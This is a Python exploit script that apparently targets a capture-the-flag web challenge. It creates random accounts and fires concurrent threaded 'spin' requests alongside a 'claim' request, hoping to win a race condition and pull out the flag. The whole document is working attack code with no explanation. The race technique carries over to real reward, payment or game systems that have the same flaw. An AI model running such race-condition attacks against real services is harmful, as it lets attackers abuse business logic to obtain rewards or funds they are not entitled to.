import requests, threading, time

base = 'https://web-random-cheese.tracebash.xyz'

def register_login():
    s = requests.Session()
    import string, random
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    s.post(f'{base}/register', data={'username': name, 'password': name}, allow_redirects=False)
    s.post(f'{base}/login', data={'username': name, 'password': name}, allow_redirects=False)
    return s, name

# Race: do 10 spins and claim simultaneously
for attempt in range(5):
    s, name = register_login()
    
    results = []
    lock = threading.Lock()
    
    def do_spin():
        r = s.post(f'{base}/spin')
        with lock:
            results.append(r.json())
    
    threads = []
    for i in range(10):
        t = threading.Thread(target=do_spin)
        threads.append(t)
        t.start()
    
    # Start claim while spins are happening
    time.sleep(0.02)  # tiny delay
    r_claim = s.post(f'{base}/claim')
    
    for t in threads:
        t.join()
    
    print(f'Attempt {attempt}: claim_status={r_claim.status_code}')
    # Check if claim has success or flag
    body = r_claim.text
    if 'flag' in body.lower() or '85' in body[:500] or 'win' in body.lower() or 'grand' in body.lower():
        print('INTERESTING RESPONSE!')
        print(body[:2000].encode('ascii', errors='replace').decode('ascii'))
        break
    print(f'  spins: {len(results)}, scores: {[r["score"] for r in sorted(results, key=lambda x: x["spins"])]}')
    
# Also try with no delay
print('\n--- No delay ---')
s, _ = register_login()
t = threading.Thread(target=lambda: [s.post(f'{base}/spin') for _ in range(10)])
t.start()
r = s.post(f'{base}/claim')
t.join()
print('Claim status:', r.status_code)
if 'flag' in r.text.lower():
    print(r.text[:2000].encode('ascii', errors='replace').decode('ascii'))